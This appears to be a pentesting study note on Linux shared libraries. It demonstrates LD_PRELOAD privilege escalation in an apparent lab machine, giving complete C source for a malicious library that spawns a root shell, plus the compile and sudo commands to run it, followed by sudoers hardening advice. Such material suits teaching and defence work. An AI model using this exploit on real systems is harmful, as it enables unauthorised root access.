---
title: Shared libraries-  LD_PRELOAD / LD_LIBRARY_PATH
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Shared libraries: LD_PRELOAD / LD_LIBRARY_PATH

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs.

Two types of libraries exist in Linux:

- `static libraries` (denoted by the .a file extension) 
- and `dynamically linked shared object libraries` (denoted by the .so file extension).

When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries:

- Using the `-rpath` or `-rpath-link` flags when compiling a program,
- using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`
-  placing libraries in the `/lib` or `/usr/lib` default directories
- or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file


Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones.

The shared objects required by a binary can be viewed using the `ldd` utility. For instance, this command  lists all the libraries required by `/bin/ls`, along with their absolute paths.

```shell-session
ldd /bin/ls
```

## LD_PRELOAD Privilege Escalation

Let's see an example of how we can utilize the [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges.

```bash
sudo -l
```

Output:

```shell-session
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

This user has rights to restart the openssl service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances.

However, note here `env_keep+=LD_PRELOAD`. This lets us **override functions** and execute arbitrary code **inside a privileged process**. Specifically:

- The system **does NOT clear LD_PRELOAD when using sudo**.
- We can **force `openssl` to load a malicious library (`library.so`)**.

So we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Remove LD_PRELOAD to avoid detection
    setgid(0);               // Set group ID to root
    setuid(0);               // Set user ID to root
    system("/bin/bash");     // Spawn a root shell
}

```

We can compile this as follows:

```shell-session
 gcc -fPIC -shared -o library.so library.c -nostartfiles
```

- `-fPIC`: Position-independent code (required for shared libraries).
- `-shared`: Compile as a shared library (`.so` file).
- `-nostartfiles`: Exclude standard startup files (smaller payload).


Finally, we can escalate privileges by executing **Openssl restart** with our malicious library injected. We need to specify the full path to the malicious library file.

```shell-session
sudo LD_PRELOAD=~/library.so /usr/bin/openssl restart
```


- `openssl restart` **loads `library.so` into memory**.
- The `_init()` function executes **before Openssl even starts**.
- It **grants us root privileges** and spawns a **root shell**.



### **How to Defend Against This?**

- **Remove `env_keep+=LD_PRELOAD` from sudoers!**

```
sudo visudo
```

- Remove or comment out the line:

```
# Defaults env_keep+=LD_PRELOAD`
```

- **Use `secure_path` restrictions** to prevent attackers from loading malicious libraries.
- **Ensure sudoers rules are specific and minimal** (e.g., avoid `NOPASSWD` where unnecessary).